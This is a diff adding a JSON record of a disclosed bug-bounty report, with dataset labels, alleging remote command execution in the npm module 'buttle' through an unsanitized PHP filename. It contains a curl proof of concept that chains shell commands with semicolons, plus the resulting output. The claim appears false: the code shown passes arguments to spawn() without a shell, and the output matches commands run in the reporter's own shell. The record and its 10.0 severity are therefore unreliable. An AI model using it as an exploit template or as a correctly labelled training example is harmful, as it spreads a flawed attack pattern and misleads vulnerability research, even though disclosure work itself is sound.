@@ -1,0 +1,49 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "bl4de ",
+  "title": "[buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag",
+  "content": "\nI would like to report Remote Code Execution in buttle module.\nWhen buttle is run with --php-bin option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands.\nModule\nmodule name: buttle\nversion: 0.2.0\nnpm page: https://www.npmjs.com/package/buttle\nModule Description\nSimple static file (+ markdown) server.\nModule Stats\nStats:\nN/A, estimated ~20-40 downloads/week\nVulnerability\nVulnerability Description\nWhen buttle is run with --php-bin option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands. This is possible due to this code:\nCode 529 Bytes\n1// ./node_modules/buttle/lib/mid-php.js, line 15\n2\n3    var phpFile = norm(join(docroot, req.url));\n4    fs.exists(phpFile, function(exists) {\n5    if(exists) {\n6        res.setHeader('Content-Type', 'text/html');\n7\n8        var cp = require('child_process').spawn(phpBin, [phpFile]);\n9\n10        cp.stdout.on('data', function(data) {\n11        res.write(data);\n12        });\n13\n14        cp.stderr.on('data', function(data) {\n15        res.write(data);\n16        });\n17\n18        cp.on('close', function() {\n19        res.end('');\n20        });\n21\n22    } else {\nAs you can notice, spawn() method is called with PHP file as an argument, but no sanitization is apllied on phpFile variable. Using curl, I was able to pass example PHP filename concatenated with ;[shell cmd] string, which allows me to execute command on the server.\nSteps To Reproduce:\ninstall buttle:\nCode 14 Bytes\n1$ npm i buttle\ncreate test.php file with folloing content:\nCode 30 Bytes\n1<?php\n2echo 'Its working!';\n3?>\n4\nrun buttle with PHP support:\nCode 88 Bytes\n1$ ./node_modules/buttle/bin/buttle -p 8080 --php-bin /usr/bin/php\n2Listening on port 8080\nexecute following command in the console:\nCode 94 Bytes\n1$ curl -v --path-as-is http://localhost:8080/test.php;whoami;uname -a;pwd;echo \"uh oh, RCE :P\"\nsee response from the server containing results of execution of injected commands:\nCode 533 Bytes\n1*   Trying ::1...\n2* Connected to localhost (::1) port 8080 (#0)\n3> GET /test.php HTTP/1.1\n4> Host: localhost:8080\n5> User-Agent: curl/7.47.0\n6> Accept: */*\n7> \n8< HTTP/1.1 200 OK\n9< Content-Type: text/html\n10< Date: Thu, 29 Mar 2018 10:35:22 GMT\n11< Connection: keep-alive\n12< Transfer-Encoding: chunked\n13< \n14* Connection #0 to host localhost left intact\n15Its working!rafal.janicki\n16Linux LT0081U2 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\n17/home/rafal.janicki/playground/hackerone/Node\n18uh oh, RCE :P\nPatch\nphpFile variable should be sanitized. Ideally, it should strip everything what comes after .php extension in filename and do not allow to use any Bash special characters (like semicolon, pipe, comma etc.)\nSupporting Material/References:\nOperating system: Ubuntu 16.04\nNode.js 8.9.4\nnpm v. 5.6.0\ncurl v. 7.47.0\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nI hope my report will help to keep Node.js ecosystem and its users safe :)\nRegards,\nRafal 'bl4de' Janicki\nImpact\nAn attacker is able to execute commands on remote server where buttler with --php-bin flag is run.\n\n",
+  "severity": [
+    10.0,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "OS Command Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1526068320,
+  "report_url": "https://hackerone.com/reports/331032",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install buttle: `npm i buttle`"
+    ],
+    [
+      2,
+      "Run buttle with PHP support: `./node_modules/buttle/bin/buttle -p 8080 --php-bin /usr/bin/php`"
+    ],
+    [
+      3,
+      "Execute a curl command with injected shell commands: `curl -v --path-as-is http://localhost:8080/test.php;whoami;uname -a;pwd;echo \"uh oh, RCE :P\"`"
+    ]
+  ],
+  "vuln_description": "The vulnerability allows Remote Code Execution (RCE) in the buttle module when run with the --php-bin option. The PHP filename is not sanitized before being passed to the spawn() method, enabling command injection via shell metacharacters (e.g., semicolons) in the URL.",
+  "reason": "The vulnerability is straightforward to discover as it involves a common command injection pattern (unsanitized input passed to a shell command) and does not require complex interactions or state manipulation. The attack vector is direct and well-documented in security literature.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection through unsanitized PHP filename input when running with the --php-bin flag. This is a server-side issue where the input is directly used in a shell command without proper sanitization. The proposed methodologies focus on authentication and authorization boundaries (AuthN/AuthZ) and Insecure Direct Object References (IDOR) within web applications, not command injection vulnerabilities in server-side processing of file names or command-line arguments.",
+    "is_detectable": false
+  }
+}
